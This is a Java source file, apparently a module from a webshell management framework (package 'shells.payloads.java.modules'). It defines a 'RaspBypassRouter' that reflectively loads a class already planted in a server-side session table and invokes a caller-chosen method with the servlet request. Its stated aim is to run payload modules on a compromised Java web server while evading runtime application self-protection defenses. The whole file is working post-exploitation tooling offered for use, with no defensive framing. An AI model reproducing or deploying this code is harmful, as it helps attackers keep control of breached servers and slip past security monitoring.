package shells.payloads.java.modules;

import java.io.PrintWriter;
import java.io.StringWriter;
import java.lang.reflect.Method;
import java.util.Map;

/**
 * Routes RASP calls through the native payload {@code payloadBytes} branch:
 * {@code setSession(moduleContext)} then {@code execute()}, without {@code evalClassName} + {@code Map} reflection.
 * Expects {@code RaspBypassModule} to already be {@code include}'d under {@code evalClassName} in {@code sessionTable}.
 */
public class RaspBypassRouterModule {

    private Map session;

    public void setSession(Map session) {
        this.session = session;
    }

    public void setServletRequest(Object servletRequest) {
    }

    public String getModuleName() {
        return "RaspBypassRouter";
    }

    private String getString(String key) {
        if (this.session == null) {
            return null;
        }
        Object value = this.session.get(key);
        if (value instanceof byte[]) {
            return new String((byte[]) value);
        }
        return value != null ? value.toString() : null;
    }

    public byte[] execute() {
        try {
            String evalKey = getString("evalClassName");
            String methodName = getString("methodName");
            if (evalKey == null || evalKey.trim().isEmpty()) {
                return "[-] RaspBypassRouter: missing evalClassName".getBytes();
            }
            if (methodName == null || methodName.trim().isEmpty()) {
                return "[-] RaspBypassRouter: missing methodName".getBytes();
            }

            Object st = this.session.get("sessionTable");
            if (!(st instanceof Map)) {
                return "[-] RaspBypassRouter: sessionTable missing (include RaspBypassModule on server first)".getBytes();
            }

            Map<?, ?> sessionTable = (Map<?, ?>) st;
            Object clsObj = sessionTable.get(evalKey);
            if (!(clsObj instanceof Class)) {
                return ("[-] RaspBypassRouter: no Class for evalClassName=" + evalKey + " (re-include module?)").getBytes();
            }

            Class<?> modClass = (Class<?>) clsObj;
            Object inst = modClass.newInstance();

            Method setModSession = modClass.getMethod("setSession", Map.class);
            setModSession.invoke(inst, this.session);

            try {
                Method setReq = modClass.getMethod("setServletRequest", Object.class);
                Object req = this.session.get("servletRequest");
                setReq.invoke(inst, req);
            } catch (Throwable ignored) {
            }

            Method target = modClass.getMethod(methodName);
            Object out = target.invoke(inst);
            if (out instanceof byte[]) {
                return (byte[]) out;
            }
            if (out == null) {
                return new byte[0];
            }
            return String.valueOf(out).getBytes();
        } catch (NoSuchMethodException e) {
            return ("[-] RaspBypassRouter: method not found or not no-arg: " + e.getMessage()).getBytes();
        } catch (Throwable t) {
            StringWriter sw = new StringWriter();
            t.printStackTrace(new PrintWriter(sw));
            return ("[-] RaspBypassRouter: " + t + "\n" + sw).getBytes();
        }
    }
}
